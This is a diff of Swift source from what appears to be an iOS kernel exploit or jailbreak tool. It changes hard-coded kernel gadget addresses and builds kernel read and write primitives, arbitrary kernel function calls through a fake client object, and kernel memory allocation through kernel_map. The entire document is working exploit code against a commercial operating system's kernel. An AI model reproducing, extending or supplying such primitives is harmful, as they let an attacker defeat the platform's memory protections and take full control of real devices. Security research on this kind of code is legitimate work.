@@ -46,11 +46,17 @@ let kckw32_gadget: UInt64 = 0xFFFFFFF00733CF2C
 
 
 let rk32_static_gadget: UInt64 = 0xfffffff006c6a87c
-let wk32_static_gadget: UInt64 = 0xfffffff0068f0ccc
+let wk32_static_gadget: UInt64 = 0xfffffff0068d8680
+
 @_cdecl("kckw32")
 func kckw32(virt: UInt64, what: UInt32) {
-    NSLog("ABOUT TO KCKW32!!")
-    kcall(kckw32_gadget + kernel_slide, virt - 0x80, UInt64(what), 0, 0, 0, 0, 0)
+    kcall_6_nox0 (
+        wk32_static_gadget + kernel_slide,
+        0, // x0
+        UInt64(what), // w1: what
+        virt, // x2: where
+        0, 0, 0
+    )
 }
 
 func split(_ value: UInt64) -> (UInt32, UInt32) {
@@ -66,31 +72,60 @@ func combine(upper: UInt32, lower: UInt32) -> UInt64 {
 
 @_cdecl("kckw64")
 func kckw64(virt: UInt64, what: UInt64) {
-    NSLog("ABOUT TO KCKW32!!")
         
     let (upper, lower) = split(what)
-    
-    kcall(kckw32_gadget + kernel_slide, virt - 0x80, UInt64(upper), 0, 0, 0, 0, 0)
-    kcall(kckw32_gadget + kernel_slide, virt - 0x80 + 0x4, UInt64(lower), 0, 0, 0, 0, 0)
+        
+    kckw32(virt: virt, what: lower)
+    kckw32(virt: virt + 0x4, what: upper)
 }
 
 @_cdecl("kckr32")
 func kckr32(virt: UInt64) -> UInt32 {
-    NSLog("ABOUT TO KCRK32!!")
-    return UInt32(truncatingIfNeeded: kcallread_raw(
+    return UInt32(truncatingIfNeeded: kcall_6_nox0(
         rk32_static_gadget + kernel_slide,
         0, // x0
         0, // x1: ldr imm
         virt, // x2: ldr address
-        0, 0, 0, 0
+        0, 0, 0
     ))
 }
 
 @_cdecl("kckr64")
 func kckr64(virt: UInt64) -> UInt64 {
-    NSLog("ABOUT TO KCRK32!!")
     let lower = kckr32(virt: virt)
     let upper = kckr32(virt: virt + 0x4)
         
-    return combine(upper: UInt32(truncatingIfNeeded: upper), lower: UInt32(truncatingIfNeeded: lower))
+    let addr = combine(upper: UInt32(truncatingIfNeeded: upper), lower: UInt32(truncatingIfNeeded: lower))
+        
+    return addr
+}
+
+func jbd_kcall(_ addr: UInt64, _ x0: UInt64, _ x1: UInt64, _ x2: UInt64, _ x3: UInt64, _ x4: UInt64, _ x5: UInt64) -> UInt64 {
+    kckw64(virt: fake_client + 0x40, what: x0)
+    let ret = kcall_6_nox0(addr, x0, x1, x2, x3, x4, x5)
+    kckw64(virt: fake_client + 0x40, what: 0)
+    return ret
+}
+
+var jbd_kernelmap: UInt64 = 0
+
+func jbd_kalloc(_ size: size_t) -> UInt64 {
+    let kernel_map = jbd_kernelmap;
+    let VM_KERN_MEMORY_BSD: UInt64 = 2
+    
+    let ret = jbd_kcall(wk32_static_gadget + kernel_slide,
+          kernel_map,
+          kalloc_scratchbuf,
+          UInt64(size),
+          UInt64(VM_FLAGS_ANYWHERE),
+          VM_KERN_MEMORY_BSD,
+          0);
+    
+    let addr = kckr64(virt: kalloc_scratchbuf)
+        
+    print("kalloc returned:", String(format: "0x%02llX", addr), String(format: "0x%02X", ret), ret, String(cString: mach_error_string(kern_return_t(ret)))); sleep(1)
+    
+    kckw64(virt: kalloc_scratchbuf, what: 0)
+    
+    return addr;
 }
